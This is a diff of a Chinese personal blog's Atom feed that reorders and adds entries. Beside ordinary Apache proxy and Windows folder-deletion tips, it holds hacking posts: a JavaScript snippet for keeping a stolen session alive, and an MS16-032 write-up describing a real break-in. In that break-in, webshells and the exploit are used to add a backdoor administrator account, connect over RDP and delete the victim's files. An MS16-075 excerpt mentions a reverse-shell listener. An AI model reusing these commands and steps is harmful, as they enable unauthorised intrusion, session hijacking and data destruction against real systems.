@@ -69,26 +69,26 @@
   </entry>
   
   <entry>
-    <title>Apache设置反向代理</title>
-    <link href="http://yoursite.com/2018/04/03/Apache%E8%AE%BE%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9B%AE%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/"/>
-    <id>http://yoursite.com/2018/04/03/Apache设置反向代理目录的方法/</id>
+    <title>windows下删除不掉文件夹：找不到该项目无法删除文件夹</title>
+    <link href="http://yoursite.com/2018/04/03/windows%E4%B8%8B%E5%88%A0%E9%99%A4%E4%B8%8D%E6%8E%89%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%9A%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AF%A5%E9%A1%B9%E7%9B%AE%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
+    <id>http://yoursite.com/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/</id>
     <published>2018-04-03T10:04:51.000Z</published>
-    <updated>2018-07-14T17:07:35.599Z</updated>
+    <updated>2018-07-15T15:42:06.187Z</updated>
     
-    <content type="html"><![CDATA[<p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p><p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p><p>apache反向代理全站<br><code>`</code>bash</p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> <p>apache反向代理二级目录 </p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> ]]></content>
+    <content type="html"><![CDATA[<p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;设置反向代理有三个文件要用apache目录下&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
+        &lt;p&gt;&lt;img src=&quot;http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJ
       
     
     </summary>
     
-      <category term="SEO" scheme="http://yoursite.com/categories/SEO/"/>
+      <category term="杂七杂八" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
     
-      <category term="反向代理" scheme="http://yoursite.com/categories/SEO/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
+      <category term="windows7" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/windows7/"/>
     
     
   </entry>
@@ -121,26 +121,26 @@
   </entry>
   
   <entry>
-    <title>windows下删除不掉文件夹：找不到该项目无法删除文件夹</title>
-    <link href="http://yoursite.com/2018/04/03/windows%E4%B8%8B%E5%88%A0%E9%99%A4%E4%B8%8D%E6%8E%89%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%9A%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AF%A5%E9%A1%B9%E7%9B%AE%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
-    <id>http://yoursite.com/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/</id>
+    <title>Apache设置反向代理</title>
+    <link href="http://yoursite.com/2018/04/03/Apache%E8%AE%BE%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9B%AE%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2018/04/03/Apache设置反向代理目录的方法/</id>
     <published>2018-04-03T10:04:51.000Z</published>
-    <updated>2018-07-15T15:42:06.187Z</updated>
+    <updated>2018-07-14T17:07:35.599Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p><p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p><p>apache反向代理全站<br><code>`</code>bash</p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> <p>apache反向代理二级目录 </p><virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> ]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&lt;img src=&quot;http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJ
+        &lt;p&gt;设置反向代理有三个文件要用apache目录下&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
       
     
     </summary>
     
-      <category term="杂七杂八" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
+      <category term="SEO" scheme="http://yoursite.com/categories/SEO/"/>
     
-      <category term="windows7" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/windows7/"/>
+      <category term="反向代理" scheme="http://yoursite.com/categories/SEO/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
     
     
   </entry>
@@ -250,6 +250,31 @@
   </entry>
   
   <entry>
+    <title>即可保证session不被服务器因超时注销</title>
+    <link href="http://yoursite.com/2018/02/27/%E4%BF%9D%E8%AF%81session%E4%B8%8D%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%A0%E8%B6%85%E6%97%B6%E6%B3%A8%E9%94%80/"/>
+    <id>http://yoursite.com/2018/02/27/保证session不被服务器因超时注销/</id>
+    <published>2018-02-27T08:42:19.000Z</published>
+    <updated>2018-07-07T12:36:55.755Z</updated>
+    
+    <content type="html"><![CDATA[<p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码&lt;br&gt;使用方法:&lt;br&gt;拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="XSS" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XSS/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>htaccess配合apach提权</title>
     <link href="http://yoursite.com/2018/02/27/htaccess%E9%85%8D%E5%90%88apache%20%E6%8F%90%E6%9D%83/"/>
     <id>http://yoursite.com/2018/02/27/htaccess配合apache 提权/</id>
@@ -278,31 +303,6 @@
   </entry>
   
   <entry>
-    <title>即可保证session不被服务器因超时注销</title>
-    <link href="http://yoursite.com/2018/02/27/%E4%BF%9D%E8%AF%81session%E4%B8%8D%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%A0%E8%B6%85%E6%97%B6%E6%B3%A8%E9%94%80/"/>
-    <id>http://yoursite.com/2018/02/27/保证session不被服务器因超时注销/</id>
-    <published>2018-02-27T08:42:19.000Z</published>
-    <updated>2018-07-07T12:36:55.755Z</updated>
-    
-    <content type="html"><![CDATA[<p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码&lt;br&gt;使用方法:&lt;br&gt;拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="XSS" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XSS/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>MS16-075提权</title>
     <link href="http://yoursite.com/2018/01/15/MS16-075%E6%8F%90%E6%9D%83/"/>
     <id>http://yoursite.com/2018/01/15/MS16-075提权/</id>
@@ -319,6 +319,32 @@
 &lt;p&gt;目标IP:192.168.163.134&lt;br&gt;接收反弹的IP：192.168.163.129  //注意：必须是外网IP&lt;br&gt;本机IP：192.168.163.120&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&quot;1，在本机MSF框架执行
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="提权" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>MS16-032提权</title>
+    <link href="http://yoursite.com/2018/01/15/MS16-032%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2018/01/15/MS16-032提权/</id>
+    <published>2018-01-15T10:37:51.000Z</published>
+    <updated>2018-07-15T16:01:32.113Z</updated>
+    
+    <content type="html"><![CDATA[<p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p><h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p><h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！&lt;br&gt;PS：操作很白痴，大牛勿喷——Bug’小虫&lt;/p&gt;
+&lt;h3 id=&quot;1-刚开始用的php一句话，发现执行不了命
       
     
     </summary>
@@ -384,32 +410,6 @@
   </entry>
   
   <entry>
-    <title>MS16-032提权</title>
-    <link href="http://yoursite.com/2018/01/15/MS16-032%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2018/01/15/MS16-032提权/</id>
-    <published>2018-01-15T10:37:51.000Z</published>
-    <updated>2018-07-15T16:01:32.113Z</updated>
-    
-    <content type="html"><![CDATA[<p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p><h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure><p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img 